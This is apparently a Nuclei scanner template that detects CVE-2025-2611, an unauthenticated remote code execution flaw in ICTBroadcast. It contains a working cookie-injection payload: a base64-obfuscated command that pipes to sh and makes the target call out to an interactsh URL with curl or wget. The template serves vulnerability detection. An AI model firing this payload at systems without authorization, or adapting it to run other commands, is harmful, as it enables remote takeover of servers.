id: cve-2025-2611

info:
  name: ICTBroadcast Unauthenticated RCE
  author: Chocapikk
  severity: critical
  description: |
    ICTBroadcast is vulnerable to unauthenticated remote code execution (RCE) via session cookie injection.
    The vulnerability exists in the way session cookies are handled and processed, allowing an attacker to inject arbitrary system commands.
  reference:
    - https://sploitus.com/exploit?id=PACKETSTORM:207873
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-2611
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-2611
    cwe-id: CWE-78
  metadata:
    verified: true
    max-request: 2
  tags: cve,cve2025,rce,ictbroadcast

flow: |
  http(1) && http(2)

http:
  - id: step-1
    method: GET
    path:
      - "{{BaseURL}}/login.php"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Set-Cookie:"

    extractors:
      - type: regex
        name: cookie_name
        part: header
        internal: true
        group: 1
        regex:
          - '(?mi)^Set-Cookie:\s*([A-Za-z0-9_-]+)='

  - id: step-2
    raw:
      - |
        GET /login.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{cookie_name}}={{cookie_payload}}

    disable-cookie: true
    payloads:
      cookie_payload:
        - "`echo${IFS}{{base64('curl -s {{interactsh-url}} || wget -qO- {{interactsh-url}}')}}|base64${IFS}-d|sh`"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
